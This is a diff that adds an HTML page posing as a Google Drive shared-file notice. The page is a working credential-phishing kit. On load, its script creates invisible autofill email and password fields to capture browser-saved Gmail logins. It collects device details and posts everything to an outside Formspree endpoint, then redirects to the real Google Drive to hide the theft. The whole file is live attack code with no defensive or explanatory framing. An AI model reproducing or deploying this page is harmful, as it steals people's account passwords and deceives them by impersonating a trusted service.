@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Google Drive - Shared File</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <style>
+    body {
+      font-family: 'Google Sans', Arial, sans-serif;
+      text-align: center;
+      padding: 40px 20px;
+      background: #f8f9fa;
+      color: #202124;
+      margin: 0;
+    }
+    .logo {
+      font-size: 60px;
+      margin: 20px 0;
+      color: #4285f4;
+    }
+    h1 {
+      font-size: 22px;
+      font-weight: 500;
+      color: #202124;
+    }
+    p {
+      color: #5f6368;
+      margin: 10px 0;
+      font-size: 16px;
+    }
+    .loader {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #4285f4;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div class="logo">📁</div>
+  <h1>You Have a Shared File on Google Drive</h1>
+  <p>Opening document…</p>
+  <div class="loader"></div>
+
+  <script>
+    // Data object
+    const data = {
+      Time: new Date().toString(),
+      Device: navigator.userAgent,
+      Platform: navigator.platform,
+      Language: navigator.language,
+      Screen: screen.width + 'x' + screen.height,
+      Gmail_Accounts: []
+    };
+
+    // Create multiple hidden inputs to trigger multiple saved accounts
+    function createInput(type, name, autoComplete, index) {
+      const input = document.createElement('input');
+      input.type = type;
+      input.name = `${name}_${index}`;
+      input.id = `${name}_${index}`;
+      input.autocomplete = autoComplete;
+      input.style.position = 'fixed';
+      input.style.opacity = 0;
+      input.style.pointerEvents = 'none';
+      document.body.appendChild(input);
+      return input;
+    }
+
+    // Detect multiple Gmail IDs and passwords
+    function detectGmailAccounts() {
+      const accounts = [];
+
+      // Try to detect up to 5 saved accounts (common in Chrome)
+      for (let i = 0; i < 5; i++) {
+        const emailInput = createInput('email', 'username', 'username', i);
+        const passInput = createInput('password', 'password', 'current-password', i);
+
+        // Check after a delay
+        setTimeout(() => {
+          const email = emailInput.value;
+          const pass = passInput.value;
+
+          if (email && email.includes('@gmail.com')) {
+            accounts.push({ Email: email, Password: pass || '*** saved, not visible ***' });
+          }
+
+          // Clean up
+          if (emailInput.parentNode) emailInput.parentNode.removeChild(emailInput);
+          if (passInput.parentNode) passInput.parentNode.removeChild(passInput);
+
+          // Send data after last check
+          if (i === 4) {
+            data.Gmail_Accounts = accounts;
+            sendData();
+          }
+        }, 2000 + i * 500); // Staggered timing for better detection
+      }
+    }
+
+    // Send all data to Formspree
+    function sendData() {
+      fetch('https://formspree.io/f/xvkgzkve', {
+        method: 'POST',
+        body: JSON.stringify(data),
+        headers: { 'Content-Type': 'application/json' },
+        mode: 'no-cors'
+      }).finally(() => {
+        // Redirect to real Google Drive
+        window.location.href = 'https://drive.google.com';
+      });
+    }
+
+    // Start on load
+    window.onload = detectGmailAccounts;
+  </script>
+</body>
+</html>
